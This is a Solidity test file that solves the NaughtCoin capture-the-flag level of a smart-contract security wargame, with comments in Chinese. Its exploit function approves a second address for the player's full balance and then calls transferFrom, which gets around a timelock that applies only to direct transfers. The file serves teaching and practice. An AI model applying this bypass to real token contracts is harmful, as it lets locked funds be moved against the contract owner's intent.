// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/NaughtCoin.sol";
import "src/levels/NaughtCoinFactory.sol";

contract TestNaughtCoin is BaseTest {
    NaughtCoin private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new NaughtCoinFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = NaughtCoin(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.balanceOf(player), level.INITIAL_SUPPLY());
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player, player);

        address midPerson = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
        // 授权 function approve(address spender, uint256 amount)
        // player将代币授权给其他人

        uint256 playerBalance = level.balanceOf(address(player));
        //        level.approve(midPerson, type(uint256).max);
        level.approve(midPerson, playerBalance);
        //  function allowance(address owner, address spender)
        uint256 allowance = level.allowance(address(player), midPerson);
        // function transferFrom(address from, address to, uint256 amount)
        vm.stopPrank();

        vm.startPrank(midPerson);
        level.transferFrom(address(player), midPerson, playerBalance);
        vm.stopPrank();

    }
}
